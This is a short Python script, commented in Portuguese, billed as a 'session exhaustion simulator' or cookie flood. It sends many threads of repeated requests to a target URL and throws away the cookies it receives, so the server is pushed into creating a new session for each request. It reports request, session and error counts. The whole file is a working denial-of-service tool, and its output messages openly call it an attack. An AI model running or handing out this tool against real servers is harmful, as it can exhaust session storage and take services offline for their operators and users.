#!/usr/bin/env python3
import sys
import argparse
import threading
import time
import urllib.request
import urllib.error

# Configuração de cores
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

stats = {
    "requests": 0,
    "cookies_received": 0,
    "errors": 0
}
running = True

def attack_thread(url):
    global stats, running

    while running:
        try:
            # Não usamos processador de cookies, então cada request é "novo"
            req = urllib.request.Request(url)
            req.add_header("User-Agent", "Session-Exhaustion-Test/1.0")

            with urllib.request.urlopen(req, timeout=5) as response:
                stats["requests"] += 1

                # Verificar se recebemos Set-Cookie
                headers = response.info()
                if 'Set-Cookie' in headers:
                    stats["cookies_received"] += 1

        except urllib.error.URLError:
            stats["errors"] += 1
        except Exception:
            stats["errors"] += 1

def monitor_thread():
    global stats, running
    while running:
        print(f"\r{Colors.OKBLUE}[*] Reqs: {stats['requests']} | Novas Sessões (Cookies): {stats['cookies_received']} | Erros: {stats['errors']}{Colors.ENDC}", end="")
        time.sleep(1)

def main():
    global running
    parser = argparse.ArgumentParser(description="Simulador de Exaustão de Sessão (Cookie Flood)")
    parser.add_argument("url", help="URL alvo que gera sessão (ex: http://example.com/login)")
    parser.add_argument("--threads", type=int, default=20, help="Número de threads (default: 20)")
    parser.add_argument("--duration", type=int, default=60, help="Duração do teste (default: 60s)")

    args = parser.parse_args()

    print(f"{Colors.HEADER}=== Iniciando Session Exhaustion Simulator ==={Colors.ENDC}")
    print(f"Alvo: {args.url}")
    print(f"Nota: Este ataque ignora cookies recebidos para forçar o servidor a criar novas sessões.")

    monitor = threading.Thread(target=monitor_thread)
    monitor.daemon = True
    monitor.start()

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=attack_thread, args=(args.url,))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Interrompido!{Colors.ENDC}")

    running = False
    print(f"\n{Colors.OKGREEN}Teste finalizado.{Colors.ENDC}")
    print(f"Total Requests: {stats['requests']}")
    print(f"Total Sessões Criadas (Est.): {stats['cookies_received']}")

if __name__ == "__main__":
    main()
